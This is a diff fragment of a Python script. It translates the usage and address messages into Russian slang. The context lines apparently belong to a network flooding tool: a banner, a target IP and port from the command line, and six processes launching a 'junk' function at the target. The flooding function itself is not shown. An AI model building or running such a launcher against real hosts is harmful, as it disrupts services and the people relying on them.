@@ -66,11 +66,11 @@ if __name__ == '__main__':
     print(Fore.RED + BANNER)
 
     if len(sys.argv) < 3:
-        print(Fore.CYAN + 'Используй: %s <address> <port>' % (sys.argv[0]))
+        print(Fore.CYAN + 'Используй: %s <айпи> <порт>' % (sys.argv[0]))
         sys.exit()
 
     addr = socket.gethostbyname(sys.argv[1])
-    print(Fore.CYAN + "Address: %s (%s)" % (sys.argv[1], addr))
+    print(Fore.CYAN + "Айпи: %s (%s)" % (sys.argv[1], addr))
     sleep(0.5)
     processes = [Process(target=junk, args=(addr, int(sys.argv[2]), i * (0.01/16))) for i in range(6)]
     for p in processes:
